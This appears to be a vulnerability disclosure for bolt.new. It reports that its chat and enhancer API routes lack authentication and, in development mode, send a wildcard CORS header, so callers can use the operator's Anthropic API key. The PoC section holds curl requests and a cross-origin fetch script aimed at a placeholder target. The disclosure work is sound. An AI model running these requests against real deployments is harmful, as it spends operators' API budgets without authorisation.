https://github.com/stackblitz/bolt.new

## Title: Unauthenticated LLM API proxy allows anyone to consume the server operator's Anthropic API key

Affected Versions: All versions through commit eda10b1 

CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L (Score 6.5)

CWE: CWE-306 -- Missing Authentication for Critical Function


### Summary

The two server-side API routes (`POST /api/chat` and `POST /api/enhancer`) perform no authentication or authorization check of any kind. Any party that can reach a deployed bolt.new instance over the network can invoke the Anthropic LLM API using the server operator's API key, without supplying any credential. During development (Vite), the server also sets `Access-Control-Allow-Origin: *`, allowing cross-origin JavaScript on any third-party webpage to call these endpoints and read the streamed response. Operators who expose a self-hosted bolt.new instance publicly face unbounded API costs and uncontrolled LLM access.

### Details

**Root cause: no auth in route actions**

`app/routes/api.chat.ts` (lines 7-59) and `app/routes/api.enhancer.ts` (lines 9-60) each export an `action` function that is the only Remix request handler for those routes. Neither function contains any check for a session, cookie, bearer token, IP allowlist, or any other credential:

```typescript
// app/routes/api.chat.ts  (lines 11-13)
async function chatAction({ context, request }: ActionFunctionArgs) {
  const { messages } = await request.json<{ messages: Messages }>();
  // No auth check - immediately calls streamText()
```

```typescript
// app/routes/api.enhancer.ts  (lines 13-15)
async function enhancerAction({ context, request }: ActionFunctionArgs) {
  const { message } = await request.json<{ message: string }>();
  // No auth check - immediately calls streamText()
```

The API key is retrieved unconditionally:

```typescript
// app/lib/.server/llm/api-key.ts
export function getAPIKey(cloudflareEnv: Env) {
  return env.ANTHROPIC_API_KEY || cloudflareEnv.ANTHROPIC_API_KEY;
}
```

There is no middleware, no session check, no rate limiting, and no IP restriction anywhere in the codebase. The `worker-configuration.d.ts` confirms the only environment variable is `ANTHROPIC_API_KEY` -- there is no session secret or auth token in the Env interface.

**CORS wildcard in development**

Vite's dev server injects `Access-Control-Allow-Origin: *` on every response. This means that in development deployments (the common self-hosting scenario per CONTRIBUTING.md), any cross-origin JavaScript can freely call these endpoints and read the full streaming response.

**Confirmed with curl:**

```
POST /api/chat HTTP/1.1
Host: localhost:9750
Content-Type: application/json

{"messages":[{"role":"user","content":"hello"}]}

HTTP/1.1 500 Internal Server Error
Access-Control-Allow-Origin: *
x-remix-catch: yes
```

The 500 is returned because the test environment used a dummy `ANTHROPIC_API_KEY`. On a real deployment the response is HTTP 200 with a streaming LLM reply. No 401 or 403 is ever returned regardless of caller identity.

**No rate limiting**

A search across all server-side source files reveals no rate limiting, throttling, or per-request cost control at any layer (no express-rate-limit, no Cloudflare Workers rate limit binding, no custom token counter).

### PoC

Prerequisites: A deployed bolt.new instance at `<TARGET>` with a valid `ANTHROPIC_API_KEY` configured.

1. Call `/api/chat` directly with no credentials and arbitrary messages:

```bash
curl -X POST https://<TARGET>/api/chat \
  -H "Content-Type: application/json" \
  -d '{"messages":[{"role":"user","content":"Write me a complete business plan"}]}'
```

Expected: HTTP 200 with a streaming LLM response, using the server's Anthropic API key. No authentication required.

2. Call `/api/enhancer` to consume API tokens via the prompt enhancer:

```bash
curl -X POST https://<TARGET>/api/enhancer \
  -H "Content-Type: application/json" \
  -d '{"message":"make me a full stack web app"}'
```

Expected: HTTP 200 with streaming response. No authentication required.

3. For cross-origin exploitation from any webpage (development mode):

```html
<script>
fetch('http://<TARGET>/api/chat', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({messages:[{role:'user',content:'hello'}]})
}).then(r => r.text()).then(console.log);
</script>
```

Expected: Browser receives the streamed LLM response due to `Access-Control-Allow-Origin: *`.

### Impact

Any unauthenticated network-adjacent attacker can:

- Consume the server operator's Anthropic API key without limit, resulting in direct financial cost to the operator
- Use the exposed API as a free LLM proxy for any purpose, including generating harmful content that would be attributed to the operator's API account
- Enumerate and read LLM responses from any origin (development mode)

The bolt.new CONTRIBUTING.md explicitly instructs self-hosters to configure a personal `ANTHROPIC_API_KEY` and provides no guidance on network access control or authentication. Any operator who follows these instructions and exposes the app on a non-private URL is immediately vulnerable.

## Disclosure
 - 2 June 2026 - reported via email
 - 11 June 2026 - acknowledged the report
